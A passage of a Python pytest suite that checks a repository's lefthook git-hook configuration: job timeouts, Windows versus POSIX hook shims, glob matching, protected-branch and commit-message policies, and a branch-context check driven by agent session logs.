    # sleep well above the 1s timeout so the two outcomes are unambiguous: Linux
    # kills at ~1s, Windows (which cannot kill the child) runs the full 5s. Kept
    # short so the Windows path, which necessarily blocks for the whole sleep,
    # does not slow the suite.
    _write_lf(repo / "hang.py", "import time\n\ntime.sleep(5)\n")
    config = {
        "pre-commit": {
            "jobs": [
                {
                    "name": "hangs",
                    "timeout": "1s",
                    "run": f'"{PYTHON_POSIX}" hang.py',
                }
            ]
        }
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))

    started = time.monotonic()
    result = _run_lefthook(repo, "run", "pre-commit", "--force", check=False)
    elapsed = time.monotonic() - started

    # lefthook detects and reports the timeout on both platforms: a non-zero exit
    # and a "timeout (1s)" summary line. Check the combined stream because Windows
    # lefthook routes a failed job's output differently than Linux does.
    assert result.returncode != 0
    assert "timeout (1s)" in (result.stdout + result.stderr)

    if sys.platform == "win32":
        # Dear future maintainer: this branch is not a shortcut. lefthook cannot
        # kill a hung child on Windows, so it blocks until the process exits on
        # its own (~5s here, the hang.py sleep) instead of terminating at the 1s
        # deadline. This is an upstream lefthook + Windows limitation: Go cannot
        # reliably terminate the sh -> python.exe process tree
        # (evilmartians/lefthook#1256, #1257, and Windows Job Object orphaning).
        # Windows developers therefore get timeout detection but not enforcement.
        # Tracked in #3289. The Linux assertions below still prove the kill
        # happens where the OS supports it.
        return

    assert elapsed < 4
    assert "signal: killed" in result.stdout


def test_install_resets_legacy_hooks_path(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _copy_runtime_config(repo)
    _git(repo, "config", "core.hooksPath", ".githooks")

    _run_lefthook(repo, "install", "--reset-hooks-path")

    _run_lefthook(repo, "check-install")
    hooks_path = _git(repo, "config", "--get", "core.hooksPath", check=False)
    hook_shim = (repo / ".git/hooks/pre-push").read_text(encoding="utf-8")

    assert hooks_path.returncode == 1
    assert os.access(repo / ".git/hooks/pre-push", os.X_OK)

    if sys.platform == "win32":
        # Dear future maintainer: this branch is not a shortcut. lefthook 2.1.10
        # generates a different shim on Windows than on Linux/macOS from the same
        # `lefthook.yml`. On Windows it emits its default template that resolves
        # lefthook from PATH via `call_lefthook run`, omitting the configured
        # `lefthook:` runner (uv run --frozen lefthook), the LEFTHOOK_BIN
        # override, and the `elif lefthook -h` fallback. Both platforms install
        # the same pinned 2.1.10 wheel, so this is an upstream shim-generator
        # difference, not a version mismatch. The reset and executable-shim
        # guarantees above still hold, and the shim still dispatches through
        # lefthook. Tracked in #3289 (with the runner-embed option deferred to
        # the #3196 shim rework). Keep the strong POSIX assertions below.
        # Assert the full dispatch line, including "$@", so the test protects
        # argument forwarding through the Windows shim, not just the command name.
        assert 'call_lefthook run "pre-push" "$@"' in hook_shim
        return

    explicit_override = 'if test -n "$LEFTHOOK_BIN"'
    configured_call = 'uv run --frozen lefthook "$@"'
    path_fallback = "elif lefthook -h >/dev/null 2>&1"

    assert explicit_override in hook_shim
    assert configured_call in hook_shim
    assert path_fallback in hook_shim
    assert hook_shim.index(explicit_override) < hook_shim.index(configured_call)
    assert hook_shim.index(configured_call) < hook_shim.index(path_fallback)


@pytest.mark.parametrize("hook_name", ["pre-commit", "pre-push"])
def test_packed_refs_repair_runs_as_a_native_first_job(
    hook_name: str,
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _copy_runtime_config(repo)
    head_sha = _commit_file(repo, "tracked.txt", "content\n")
    push_input = f"refs/heads/feature/test {head_sha} refs/heads/feature/test {head_sha}\n"

    result = _run_lefthook(
        repo,
        "run",
        hook_name,
        "--job",
        "repair-packed-refs",
        "--force",
        stdin=push_input if hook_name == "pre-push" else None,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert "repair-packed-refs" in result.stdout


def test_pre_push_repairs_corrupt_packed_refs_before_policy(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _copy_runtime_config(repo)
    head_sha = _commit_file(repo, "tracked.txt", "content\n")
    _git(repo, "branch", "packed-branch")
    _git(repo, "pack-refs", "--all")
    packed_refs = repo / ".git/packed-refs"
    packed_refs.write_bytes(packed_refs.read_bytes() + b"\n")
    push_input = f"refs/heads/feature/test {head_sha} refs/heads/feature/test {head_sha}\n"

    result = _run_lefthook(
        repo,
        "run",
        "pre-push",
        "--job",
        "repair-packed-refs",
        "--force",
        stdin=push_input,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert b"\n\n" not in packed_refs.read_bytes()
    assert packed_refs.with_name("packed-refs.before-repair").is_file()


def test_doublestar_selects_root_level_push_file(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _copy_runtime_config(repo)
    detector = repo / ".claude/skills/security-detection/detect_infrastructure.py"
    detector.parent.mkdir(parents=True, exist_ok=True)
    _write_lf(
        detector,
        "from pathlib import Path\nimport sys\n"
        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n",
    )
    _write_lf(repo / "root-only.txt", "base\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "test: base")
    base_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
    _git(repo, "update-ref", "refs/remotes/origin/main", base_sha)
    _write_lf(repo / "root-only.txt", "head\n")
    _git(repo, "add", "root-only.txt")
    _git(repo, "commit", "-qm", "test: root-only push")
    head_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
    push_input = f"refs/heads/feature/test {head_sha} refs/heads/feature/test {base_sha}\n"

    result = _run_lefthook(
        repo,
        "run",
        "pre-push",
        "--job",
        "infrastructure-advisory",
        "--force",
        stdin=push_input,
    )

    assert _git(repo, "diff", "--name-only", base_sha, head_sha).stdout == "root-only.txt\n"
    assert "infrastructure-advisory" in result.stdout
    selected_files = (repo / "root-job-ran.txt").read_text(encoding="utf-8").split(",")
    assert selected_files[0] == "--files"
    assert "root-only.txt" in selected_files


def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    marker = repo / "marker.py"
    _write_lf(
        marker,
        "from pathlib import Path\nimport sys\n"
        "p = Path('jobs.log')\n"
        "old = p.read_text() if p.exists() else ''\n"
        "entry = sys.argv[1] + ':' + ','.join(sys.argv[2:]) + '\\n'\n"
        "p.write_text(old + entry)\n",
    )
    config = {
        "glob_matcher": "doublestar",
        "pre-commit": {
            "jobs": [
                {
                    "name": "markdown-check",
                    "run": f'"{PYTHON_POSIX}" marker.py markdown {{staged_files}}',
                    "glob": "**/*.md",
                },
                {
                    "name": "python-check",
                    "run": f'"{PYTHON_POSIX}" marker.py python {{staged_files}}',
                    "glob": "**/*.py",
                },
            ]
        },
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
    _commit_file(repo, "base.txt", "base\n")
    for path in ("root.md", "nested/doc.md", "root.py", "nested/source.py"):
        target = repo / path
        target.parent.mkdir(parents=True, exist_ok=True)
        _write_lf(target, "content\n")
        _git(repo, "add", path)

    _run_lefthook(repo, "run", "pre-commit", "--job", "markdown-check", "--force")
    _run_lefthook(repo, "run", "pre-commit", "--job", "python-check", "--force")

    log = (repo / "jobs.log").read_text(encoding="utf-8")
    assert "markdown:root.md,nested/doc.md" in log or "markdown:nested/doc.md,root.md" in log
    assert "python:root.py,nested/source.py" in log or "python:nested/source.py,root.py" in log


def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    marker = repo / "marker.py"
    _write_lf(
        marker,
        "from pathlib import Path\nimport sys\n"
        "p = Path('jobs.log')\n"
        "old = p.read_text() if p.exists() else ''\n"
        "p.write_text(old + sys.argv[1] + '\\n')\n",
    )
    jobs = [
        {"name": "mypy", "run": f'"{PYTHON_POSIX}" marker.py mypy', "glob": "**/*.py"},
        {
            "name": "suppression",
            "run": f'"{PYTHON_POSIX}" marker.py suppression',
            "glob": "**/*.{py,ps1,psm1}",
            "use_stdin": True,
        },
        {
            "name": "security",
            "run": f'"{PYTHON_POSIX}" marker.py security',
            "glob": "**/*.{py,js,yml,yaml}",
            "use_stdin": True,
        },
    ]
    config = {
        "glob_matcher": "doublestar",
        "pre-push": {
            "files": "git diff --name-only origin/main...HEAD",
            "jobs": jobs,
        },
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
    _git(repo, "add", "lefthook.yml", "marker.py")
    _git(repo, "commit", "-qm", "test: base")
    base = _git(repo, "rev-parse", "HEAD").stdout.strip()
    _git(repo, "update-ref", "refs/remotes/origin/main", base)
    for path in ("root.py", "nested/source.py", "nested/config.yml"):
        target = repo / path
        target.parent.mkdir(parents=True, exist_ok=True)
        _write_lf(target, "value = 1\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "test: nested files")
    head = _git(repo, "rev-parse", "HEAD").stdout.strip()
    push_input = f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n"

    for job in ("mypy", "suppression", "security"):
        _run_lefthook(repo, "run", "pre-push", "--job", job, "--force", stdin=push_input)

    assert (repo / "jobs.log").read_text(encoding="utf-8").splitlines() == [
        "mypy",
        "suppression",
        "security",
    ]


def test_piped_pre_push_stdin_group_broadcasts_to_each_job(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    marker = repo / "marker.py"
    _write_lf(
        marker,
        "from pathlib import Path\nimport sys\n"
        "p = Path('stdin.log')\n"
        "old = p.read_text() if p.exists() else ''\n"
        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n",
    )
    jobs = [
        {
            "name": name,
            "run": f'"{PYTHON_POSIX}" marker.py {name}',
            "use_stdin": True,
        }
        for name in ("push-ref-policy", "security", "suppressions", "identity")
    ]
    config = {
        "pre-push": {
            "piped": True,
            "jobs": [{"group": {"piped": True, "jobs": jobs}}],
        }
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
    push_input = f"refs/heads/feature/test {'1' * 40} refs/heads/feature/test {'2' * 40}\n"

    _run_lefthook(repo, "run", "pre-push", "--force", stdin=push_input)

    output = (repo / "stdin.log").read_text(encoding="utf-8")
    assert output.count(push_input) == 4
    assert output.startswith("push-ref-policy:")
    assert "security:" in output
    assert "suppressions:" in output
    assert "identity:" in output


def test_native_push_files_cover_unpushed_branch_files(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "base.txt", "base\n")
    _git(repo, "remote", "add", "origin", str(repo))
    _git(repo, "update-ref", "refs/remotes/origin/feature/test", base)
    _git(repo, "branch", "--set-upstream-to=origin/feature/test", "feature/test")
    _git(repo, "config", "branch.feature/test.pushRemote", "origin")
    _commit_file(repo, "one.py", "one = 1\n")
    head = _commit_file(repo, "two.yml", "two: true\n")
    marker = repo / "marker.py"
    _write_lf(
        marker,
        "from pathlib import Path\nimport sys\n"
        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n",
    )
    config = {
        "glob_matcher": "doublestar",
        "pre-push": {
            "jobs": [
                {
                    "name": "capture",
                    "run": f'"{PYTHON_POSIX}" marker.py {{push_files}}',
                    "glob": "**/*.{py,yml}",
                }
            ]
        },
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
    push_input = f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n"

    _run_lefthook(repo, "run", "pre-push", stdin=push_input)

    assert set((repo / "push-files.log").read_text(encoding="utf-8").splitlines()) == {
        "one.py",
        "two.yml",
    }


def test_native_mypy_job_partitions_duplicate_basenames(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _copy_runtime_config(repo)
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "test: base")
    base_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
    _git(repo, "remote", "add", "origin", str(repo))
    _git(repo, "update-ref", "refs/remotes/origin/feature/test", base_sha)
    _git(repo, "branch", "--set-upstream-to=origin/feature/test", "feature/test")
    _git(repo, "config", "branch.feature/test.pushRemote", "origin")
    for directory, value in (("pkg_a", "1"), ("pkg_b", "2"), ("pkg_c", "3")):
        filename = "bar.py" if directory == "pkg_c" else "foo.py"
        path = repo / directory / filename
        path.parent.mkdir()
        _write_lf(path, f"value: int = {value}\n")
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "test: duplicate basenames")
    head_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
    push_input = f"refs/heads/feature/test {head_sha} refs/heads/feature/test {base_sha}\n"

    result = _run_lefthook(
        repo,
        "run",
        "pre-push",
        "--job",
        "python-type-check",
        stdin=push_input,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert "Duplicate module" not in result.stdout + result.stderr


def test_mypy_policy_checks_validation_modules_one_at_a_time() -> None:
    result = policy.run_mypy(
        [
            "scripts/validation/checks_spec.py",
            "scripts/validation/checks_common.py",
        ],
        PROJECT_ROOT,
    )

    assert result == 0


def test_native_dispatch_forwards_argument_stdin_and_failures(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _copy_runtime_config(repo)
    base_sha = _commit_file(repo, "tracked.txt", "base\n")
    _git(repo, "update-ref", "refs/remotes/origin/main", base_sha)
    head_sha = _commit_file(repo, "tracked.txt", "head\n")
    message = repo / "message.txt"
    _write_lf(message, "fix: clean message\n")

    clean = _run_lefthook(
        repo,
        "run",
        "commit-msg",
        "message.txt",
        "--job",
        "commit-message-policy",
        "--force",
    )
    push_input = f"refs/heads/feature/test {head_sha} refs/heads/review-target {base_sha}\n"
    pushed = _run_lefthook(
        repo,
        "run",
        "pre-push",
        "--job",
        "push-ref-policy",
        "--force",
        stdin=push_input,
    )
    _write_lf(message, f"fix: bad {chr(0x2014)} message\n")
    blocked_message = _run_lefthook(
        repo,
        "run",
        "commit-msg",
        "message.txt",
        "--job",
        "commit-message-policy",
        "--force",
        check=False,
    )
    blocked_push = _run_lefthook(
        repo,
        "run",
        "pre-push",
        "--job",
        "push-ref-policy",
        "--force",
        stdin=push_input.replace("refs/heads/review-target", "refs/heads/main"),
        check=False,
    )

    assert clean.returncode == 0
    assert pushed.returncode == 0
    assert blocked_message.returncode == 1
    # The policy prints the em-dash error to stderr (git_hook_policy.py check_commit_message).
    # lefthook echoes a failed job's stderr onto its own stdout on Linux but keeps it on
    # stderr on Windows, so assert against the combined stream to stay cross-platform.
    assert "commit message contains" in (blocked_message.stdout + blocked_message.stderr)
    assert blocked_push.returncode == 1
    assert "protected branch 'main'" in blocked_push.stderr


def test_installed_hooks_work_from_linked_worktree(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    worktree = tmp_path / "worktree"
    _init_repo(repo)
    _copy_runtime_config(repo)
    _commit_file(repo, "tracked.txt", "initial\n")
    _git(repo, "add", "lefthook.yml", "scripts", "build")
    _git(repo, "commit", "-qm", "test: add hook configuration")
    _git(repo, "worktree", "add", "-q", str(worktree), "-b", "feature/worktree")

    _run_lefthook(repo, "install", "--reset-hooks-path")

    _run_lefthook(worktree, "check-install")
    result = _run_lefthook(
        worktree,
        "run",
        "pre-commit",
        "--job",
        "branch-policy",
        "--force",
    )
    assert result.returncode == 0


def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    fixer = repo / "fixer.py"
    _write_lf(
        fixer,
        "from pathlib import Path\nimport sys\n"
        "Path(sys.argv[1]).write_text('fixed\\n', encoding='utf-8')\n"
        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n",
    )
    config = {
        "pre-commit": {
            "jobs": [
                {
                    "name": "format",
                    "run": f'"{PYTHON_POSIX}" fixer.py {{staged_files}}',
                    "glob": "*.py",
                    "stage_fixed": True,
                }
            ]
        }
    }
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
    _commit_file(repo, "source.py", "before\n")
    _git(repo, "add", "lefthook.yml", "fixer.py")
    _git(repo, "commit", "-qm", "test: add formatter")
    _write_lf(repo / "source.py", "changed\n")
    _write_file(repo, "source.py", "changed\n")
    _git(repo, "add", "source.py")

    _run_lefthook(repo, "run", "pre-commit", "--force")

    staged = _git(repo, "diff", "--cached", "--name-only").stdout.splitlines()
    assert "source.py" in staged
    assert "generated.txt" not in staged
    assert (repo / "generated.txt").is_file()


def test_branch_policy_allows_feature_and_detached_head(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked", "value\n")

    assert policy.check_branch(repo) == 0
    _git(repo, "checkout", "--detach", "-q")
    assert policy.check_branch(repo) == 0


def test_branch_policy_blocks_main(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")

    assert policy.check_branch(repo) == 1


def _write_session_log(
    repo: Path,
    *,
    branch: str | None,
    name: str = "session-1",
    legacy: bool = False,
    date: str | None = None,
    mtime: float | None = None,
    raw: str | None = None,
) -> Path:
    """Create a session log under .agents/sessions for branch-context tests.

    ``legacy`` writes the pre-schema top-level ``branch`` instead of the
    canonical ``session.branch``. ``raw`` bypasses JSON construction to
    exercise malformed input. ``mtime`` pins the modification time so the
    newest-by-mtime selection can be steered.
    """
    if date is None:
        date = datetime.now(tz=UTC).strftime("%Y-%m-%d")
    sessions = repo / ".agents" / "sessions"
    sessions.mkdir(parents=True, exist_ok=True)
    path = sessions / f"{date}-{name}.json"
    if raw is not None:
        _write_lf(path, raw)
    else:
        payload: dict[str, object] = {}
        if branch is not None:
            payload = {"branch": branch} if legacy else {"session": {"branch": branch}}
        _write_lf(path, json.dumps(payload))
    if mtime is not None:
        os.utime(path, (mtime, mtime))
    return path


def test_branch_context_allows_matching_branch(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/x")

    assert policy.check_branch_context(repo) == 0


def test_branch_context_blocks_mismatched_branch(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other")

    assert policy.check_branch_context(repo) == 1


def test_branch_context_fails_open_without_sessions_directory(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")

    assert policy.check_branch_context(repo) == 0


def test_branch_context_exempt_during_merge(tmp_path: Path) -> None:
    """A merge in progress imports another branch's log; that is not a mismatch.

    A merge checks out the incoming branch's newer session log into the tree,
    so ``_today_session_log`` would name a branch other than the current one.
    The merge guard must exempt that case, matching ``check_sessions``.
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    head = _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other")

    # Negative control: without a merge the mismatch still blocks, so the
    # merge-guard assertion below cannot pass vacuously.
    assert policy.check_branch_context(repo) == 1

    merge_head = repo / _git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip()
    _write_lf(merge_head, f"{head}\n")

    assert policy.check_branch_context(repo) == 0


def test_branch_context_fails_open_when_git_is_unavailable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No git binary means the check passes, not that it blocks.

    ``_is_merged_history`` says it fails closed, and it does for every
    indeterminate answer it can observe. A missing git binary is not one of
    those: ``_run_command`` catches only ``TimeoutExpired``, so the
    ``FileNotFoundError`` unwinds past it into the blanket handler in
    ``check_branch_context``, which returns 0 by design. Pinning that here
    keeps the docstring from drifting back into claiming a block that a
    reader would then rely on.
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other")

    # Negative control: with git working the mismatch blocks, so the assertion
    # below cannot pass just because the fixture is inert.
    assert policy.check_branch_context(repo) == 1

    def no_git(*args: object, **kwargs: object) -> NoReturn:
        raise FileNotFoundError(2, "No such file or directory: 'git'")

    monkeypatch.setattr(policy.subprocess, "run", no_git)

    assert policy.check_branch_context(repo) == 0


def _add_upstream_with(repo: Path, tracked: Path) -> None:
    """Give ``repo`` an ``origin/HEAD`` whose default branch contains ``tracked``.

    ``_is_merged_history`` asks whether a session log already exists upstream.
    Test repos are standalone, so the merged-history exemption can never apply
    to them unless a remote is built. This clones the current commit into a
    bare remote after committing ``tracked``, then points origin/HEAD at it,
    reproducing the shape a real clone has.
    """
    relative = tracked.relative_to(repo).as_posix()
    _git(repo, "add", "--", relative)
    _git(repo, "commit", "-qm", "test: land session log upstream")
    remote = repo.parent / "remote.git"
    _git(repo, "clone", "-q", "--bare", str(repo), str(remote))
    _git(repo, "remote", "add", "origin", str(remote))
    _git(repo, "fetch", "-q", "origin")
    default = _git(repo, "rev-parse", "--abbrev-ref", "HEAD").stdout.strip()
    _git(repo, "symbolic-ref", "refs/remotes/origin/HEAD", f"refs/remotes/origin/{default}")


def test_branch_context_survives_a_committed_merge_import(tmp_path: Path) -> None:
    """A committed merge of main must not wedge a branch that owns a log.

    The MERGE_HEAD exemption expires the moment the merge commit is created,
    but the imported session log stays in the tree and keeps winning the
    newest-by-mtime comparison. Recognising it as upstream history is what
    keeps the branch pushable (issue #3343).
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    imported = _write_session_log(
        repo, branch="feature/merged", name="session-merged", mtime=2_000_000_000.0
    )
    _add_upstream_with(repo, imported)
    os.utime(imported, (2_000_000_000.0, 2_000_000_000.0))

    # Negative control: the imported log alone still blocks, because the
    # exemption also requires the branch to own a log.
    assert policy.check_branch_context(repo) == 1

    _write_session_log(repo, branch="feature/x", name="session-own", mtime=1_000_000_000.0)

    assert policy.check_branch_context(repo) == 0


def test_branch_context_blocks_a_newer_log_that_is_not_upstream(tmp_path: Path) -> None:
    """The issue #682 case must survive the #3343 fix.

    Owning a log is not enough. A newer log for another branch that has NOT
    merged is a live statement that the developer session-initialised
    somewhere else, which is exactly the co-mingling signal #682 wants.
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    settled = _write_session_log(repo, branch="feature/settled", name="session-settled")
    _add_upstream_with(repo, settled)
    _write_session_log(repo, branch="feature/x", name="session-own", mtime=1_000_000_000.0)
    _write_session_log(repo, branch="feature/other", name="session-live", mtime=2_000_000_000.0)

    assert policy.check_branch_context(repo) == 1


def _worktree_on(repo: Path, branch: str, target: Path) -> Path:
    """Check ``branch`` out into a linked worktree at ``target`` and return it."""
    _git(repo, "branch", branch)
    _git(repo, "worktree", "add", "-q", str(target), branch)
    return target


def test_branch_context_exempts_a_committed_log_in_a_linked_worktree(
    tmp_path: Path,
) -> None:
    """A worktree checkout carries whatever log its branch last committed.

    That file names another branch and blocks every commit made in the
    worktree, so the documented workaround became --no-verify, which turns off
    every other hook to silence this one (issue #3408).
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")
    _commit_file(repo, "tracked", "value\n")
    imported = _write_session_log(repo, branch="feature/other", name="session-imported")
    _git(repo, "add", "--", imported.relative_to(repo).as_posix())
    _git(repo, "commit", "-qm", "test: commit a log for another branch")

    # The primary checkout still blocks: nothing about it changed.
    assert policy.check_branch_context(repo) == 1

    worktree = _worktree_on(repo, "feature/x", tmp_path / "wt")

    assert policy.check_branch_context(worktree) == 0


def test_branch_context_still_blocks_a_live_log_inside_a_worktree(
    tmp_path: Path,
) -> None:
    """The exemption covers imported history, not a session started elsewhere.

    A log written in the worktree today is untracked, so the co-mingling
    signal from issue #682 keeps its teeth inside worktrees too.
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")
    _commit_file(repo, "tracked", "value\n")
    imported = _write_session_log(
        repo, branch="feature/other", name="session-imported", mtime=1_000_000_000.0
    )
    _git(repo, "add", "--", imported.relative_to(repo).as_posix())
    _git(repo, "commit", "-qm", "test: commit a log for another branch")
    worktree = _worktree_on(repo, "feature/x", tmp_path / "wt")
    _write_session_log(
        worktree,
        branch="feature/elsewhere",
        name="session-live",
        mtime=2_000_000_000.0,
    )

    assert policy.check_branch_context(worktree) == 1


def test_a_primary_checkout_is_not_mistaken_for_a_worktree(tmp_path: Path) -> None:
    """The probe must not hand the exemption to every repository."""
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")

    assert policy._is_linked_worktree(repo) is False

    worktree = _worktree_on(repo, "feature/y", tmp_path / "wt")

    assert policy._is_linked_worktree(worktree) is True


def test_branch_context_merged_history_exemption_needs_an_upstream(tmp_path: Path) -> None:
    """Without a resolvable origin/HEAD the exemption fails closed."""
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/x", name="session-own", mtime=1_000_000_000.0)
    _write_session_log(repo, branch="feature/other", name="session-new", mtime=2_000_000_000.0)

    assert policy.check_branch_context(repo) == 1


def test_branch_context_matches_a_legacy_shaped_owned_log(tmp_path: Path) -> None:
    """Owned-log lookup reads both log shapes, like _session_branch."""
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    imported = _write_session_log(repo, branch="feature/merged", name="session-merged")
    _add_upstream_with(repo, imported)
    os.utime(imported, (2_000_000_000.0, 2_000_000_000.0))
    _write_session_log(repo, branch="feature/x", name="session-own", legacy=True, mtime=1000.0)

    assert policy.check_branch_context(repo) == 0


def test_branch_context_owned_log_lookup_skips_malformed_logs(tmp_path: Path) -> None:
    """An unparseable log must not hide a valid owned log behind it."""
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    imported = _write_session_log(repo, branch="feature/merged", name="session-zzz")
    _add_upstream_with(repo, imported)
    os.utime(imported, (2_000_000_000.0, 2_000_000_000.0))
    _write_session_log(repo, branch=None, name="session-aaa", raw="{not json")
    _write_session_log(repo, branch="feature/x", name="session-own", mtime=1000.0)

    assert policy.check_branch_context(repo) == 0


def test_branch_context_fails_open_without_today_log(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other", date="2000-01-01")

    assert policy.check_branch_context(repo) == 0


def test_branch_context_fails_open_without_branch_field(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch=None)

    assert policy.check_branch_context(repo) == 0


def test_branch_context_reads_legacy_top_level_branch(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other", legacy=True)

    assert policy.check_branch_context(repo) == 1


def test_branch_context_fails_open_on_detached_head(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other")
    _git(repo, "checkout", "--detach", "-q")

    assert policy.check_branch_context(repo) == 0


def test_branch_context_selects_newest_log_by_mtime(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/x", name="session-1", mtime=1000.0)
    _write_session_log(repo, branch="feature/other", name="session-2", mtime=2000.0)

    assert policy.check_branch_context(repo) == 1

    _write_session_log(repo, branch="feature/x", name="session-3", mtime=3000.0)
    assert policy.check_branch_context(repo) == 0


def test_branch_context_fails_open_on_malformed_log(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch=None, raw="{not valid json")

    assert policy.check_branch_context(repo) == 0

    _write_session_log(repo, branch=None, name="session-2", raw="[]", mtime=9999.0)
    assert policy.check_branch_context(repo) == 0


def test_branch_context_skips_unreadable_newest_log(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    _write_session_log(repo, branch="feature/other", name="session-1", mtime=1000.0)
    unreadable = _write_session_log(repo, branch="feature/x", name="session-2", mtime=2000.0)

    real_stat = Path.stat

    def fake_stat(self: Path, *, follow_symlinks: bool = True) -> os.stat_result:
        if self == unreadable:
            raise OSError("simulated unreadable session log")
        return real_stat(self, follow_symlinks=follow_symlinks)

    monkeypatch.setattr(Path, "stat", fake_stat)

    # The newest log (session-2, matching branch) is unreadable. The fragile
    # sorted()-over-stat implementation would raise during the sort and fail
    # open (allow). The resilient implementation skips the unreadable entry and
    # selects the readable older log (session-1), whose branch mismatches, so
    # the check blocks.
    with pytest.warns(UserWarning, match="Skipping unreadable session log"):
        assert policy.check_branch_context(repo) == 1


def test_branch_context_cli_propagates_exit_codes(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="feature/x")
    _commit_file(repo, "tracked", "value\n")
    script = PROJECT_ROOT / "scripts" / "validation" / "git_hook_policy.py"

    _write_session_log(repo, branch="feature/x", mtime=1000.0)
    match = subprocess.run(
        [sys.executable, str(script), "--repo-root", str(repo), "branch-context"],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )
    assert match.returncode == 0, match.stderr

    _write_session_log(repo, branch="feature/other", name="session-2", mtime=2000.0)
    mismatch = subprocess.run(
        [sys.executable, str(script), "--repo-root", str(repo), "branch-context"],
        capture_output=True,
        text=True,
        encoding="utf-8",
